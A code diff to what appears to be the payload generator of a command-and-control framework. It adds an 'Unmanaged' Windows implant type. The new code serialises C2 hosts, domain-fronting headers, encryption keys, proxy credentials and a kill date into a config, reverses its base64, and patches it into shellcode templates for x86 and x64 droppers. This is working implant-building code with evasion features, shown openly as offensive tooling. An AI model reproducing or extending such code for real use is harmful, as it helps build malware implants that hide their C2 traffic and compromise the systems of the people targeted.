@@ -6,7 +6,11 @@ import os
 import re
 import shutil
 import subprocess
+import time
+from datetime import datetime
+from distutils.dir_util import copy_tree
 from enum import Enum
+from urllib.parse import urlparse
 
 import donut
 
@@ -28,6 +32,7 @@ class PayloadType(Enum):
     Sharp = "Sharp_v4"
     PBindSharp = "PBindSharp_v4"
     FCommSharp = "FCommSharp_v4"
+    Unmanaged = "Unmanaged"
 
 
 class Payloads(object):
@@ -312,11 +317,77 @@ class Payloads(object):
             subprocess.check_output(fcomm_compile_command, shell=True)
             os.rename(f"{self.output_directory}System.Config.Manager.exe", f"{self.output_directory}{name}fcomm_cs.exe")
 
+
+    def create_unmanaged_windows(self, name=""):
+        self.quickstart_log(Colours.END)
+        self.quickstart_log("Windows native files:")
+
+        # Serialize our config data in a way that can be embedded into the resource section of the dropper binary
+        # Arrays of items are represented by repeated keys (e.g. domain_front_header=header1.google.com\0domain_front_header=header2.google.com
+        # the overall string MUST be null terminated
+        # For now, ints and floats are represented as strings, might be good to serialise them (with struct?) in the future
+
+        # Even if domain fronting hasn't been setup by the user, we need to set a 'domain-front-header' per C2 comms host as otherwise Curl sends requests with an empty hosts header
+        # and that breaks things...
+
+        # The basic logic is to loop through each server that is set, and see if there's a matching domain front header.
+        # If not, extract the netloc from the URL (e.g. the domain) and use that
+        servers = self.payload_comms_host.split(",")
+        domain_front_headers = self.domain_front_header.split(",")
+
+        host_headers = []
+        for i in range(0, len(servers)):
+            try:
+                dfh_len = len(domain_front_headers[i].replace("\"", ""))
+            except IndexError:
+                dfh_len = 0
+                pass
+
+            if dfh_len == 0:
+                host_headers.append(urlparse(servers[i].replace("\"", "")).hostname)
+            # A host header was set - so use that instead
+            else:
+                host_headers.append(domain_front_headers[i])
+
+        mapping = {
+            "key=": self.encryption_key,
+            "urlid=": self.url_id,
+            "url_suffix2=": self.connect_url + "?n",
+            "domain_front_hdr=": host_headers,
+            "server_clean=": self.payload_comms_host.replace("https://", "").split(","),
+            "ua=": self.user_agent,
+            "proxy_url=": self.proxy_url,
+            "proxy_user=": self.proxy_user,
+            "proxy_pass=": self.proxy_password,
+            "sleep_time=": self.sleep.replace("s", ""),  # TODO what if hours or minutes?
+            "kill_date=": int(time.mktime(datetime.strptime(self.kill_date, "%Y-%m-%d").timetuple())),
+        }
+
+        config_string = ''
+
+        for element in mapping:
+            if isinstance(mapping[element], list):
+                for item in mapping[element]:
+                    config_string += element
+                    config_string += str(item).replace("\"", "").strip()
+                    config_string += "\x00"
+            else:
+                config_string += element
+                config_string += str(mapping[element]).replace("\"", "").strip()
+                config_string += "\x00"
+
+        config_string += "CONFIG_END\x00"
+
+        with open(f'{self.output_directory}{name}windows_config.bin', 'w') as f:
+            f.write(config_string)
+
+        self.quickstart_log(f'Windows config written to {self.output_directory}{name}windows_config.bin')
+
+
     def patch_bytes(self, filename, dll, offset, patch_placeholder_length, payload_type, name=""):
         filename = f"{self.output_directory}{filename}"
         with open(filename, 'wb') as f:
             f.write(base64.b64decode(dll))
-        patch_space = 45000
 
         if payload_type == PayloadType.Posh_v2:
             source_file_name = f"{self.output_directory}{name}{'dropper_ps_v2.exe'}"
@@ -333,20 +404,25 @@ class Payloads(object):
         elif payload_type == PayloadType.FCommSharp:
             source_file_name = f"{self.output_directory}{name}{'fcomm_cs.exe'}"
 
+        elif payload_type == PayloadType.Unmanaged:
+            source_file_name = f"{self.output_directory}{name}{'windows_config.bin'}"
+
         else:
             return
 
         with open(source_file_name, "rb") as f:
             dllbase64 = f.read()
         dllbase64 = base64.b64encode(dllbase64).decode("utf-8")
-        patch_length = patch_space - len(dllbase64)
+        if payload_type == PayloadType.Unmanaged:
+            dllbase64 = dllbase64[::-1]
+        patch_leftovers = patch_placeholder_length - len(dllbase64)
 
-        if patch_length > patch_placeholder_length:
+        if len(dllbase64) > patch_placeholder_length:
             raise Exception(
-                f"Patch length ({patch_length}) is greater than the placeholder space available in the shellcode ({patch_placeholder_length}) (more AAAAs need adding to the shellcode)")
+                f"\nPatch length ({len(dllbase64)}) is greater than the placeholder space available in the shellcode ({patch_placeholder_length}) (more AAAAs need to be added to the buffer)")
 
         patch = dllbase64
-        patch2 = "".ljust(patch_length, '\x00')
+        patch2 = "".ljust(patch_leftovers, '\x00')
         patch3 = f"{patch}{patch2}"
 
         with open(filename, "r+b") as f:
@@ -402,6 +478,12 @@ class Payloads(object):
                                        f"{name}FCommSharp_v4_x64_Shellcode.b64",
                                        f"{PayloadTemplatesDirectory}Sharp_v4_x64_Shellcode.b64",
                                        PayloadType.FCommSharp, name)
+            self.create_shellcode_file(f"{name}Unmanaged_x86_Shellcode.bin", f"{name}Unmanaged_x86_Shellcode.b64",
+                                       f"{PayloadTemplatesDirectory}Unmanaged_x86_Shellcode.b64", PayloadType.Unmanaged,
+                                       name)
+            self.create_shellcode_file(f"{name}Unmanaged_x64_Shellcode.bin", f"{name}Unmanaged_x64_Shellcode.b64",
+                                       f"{PayloadTemplatesDirectory}Unmanaged_x64_Shellcode.b64", PayloadType.Unmanaged,
+                                       name)
         else:
             self.create_shellcode_file(f"{name}PBindSharp_v4_x86_Shellcode.bin",
                                        f"{name}PBindSharp_v4_x86_Shellcode.b64",
@@ -481,6 +563,11 @@ class Payloads(object):
                 x86base64 = f.read()
             with open("%s%s" % (self.output_directory, name + "FCommSharp_v4_x64_Shellcode.bin"), "rb") as f:
                 x64base64 = f.read()
+        elif payloadtype == PayloadType.Unmanaged:
+            with open("%s%s" % (self.output_directory, name + "Unmanaged_x86_Shellcode.bin"), "rb") as f:
+                x86base64 = f.read()
+            with open("%s%s" % (self.output_directory, name + "Unmanaged_x64_Shellcode.bin"), "rb") as f:
+                x64base64 = f.read()                
 
         x86base64 = base64.b64encode(x86base64)
         x64base64 = base64.b64encode(x64base64)
@@ -533,6 +620,11 @@ class Payloads(object):
                 x86base64 = f.read()
             with open("%s%s" % (self.output_directory, name + "FCommSharp_v4_x64_Shellcode.bin"), "rb") as f:
                 x64base64 = f.read()
+        elif payloadtype == PayloadType.Unmanaged:
+            with open("%s%s" % (self.output_directory, name + "Unmanaged_x86_Shellcode.bin"), "rb") as f:
+                x86base64 = f.read()
+            with open("%s%s" % (self.output_directory, name + "Unmanaged_x64_Shellcode.bin"), "rb") as f:
+                x64base64 = f.read()                
 
         x86base64 = base64.b64encode(x86base64)
         x64base64 = base64.b64encode(x64base64)
@@ -720,6 +812,7 @@ class Payloads(object):
         self.quickstart_log(Colours.END + "Payloads/droppers using shellcode:" + Colours.END)
         self.quickstart_log(Colours.END + "==================================" + Colours.END)
         self.create_droppers(name, debug_payloads=debug_payloads)
+        self.create_unmanaged_windows(name)
         self.create_shellcode(name)
         self.create_dotnet2js(name)
 
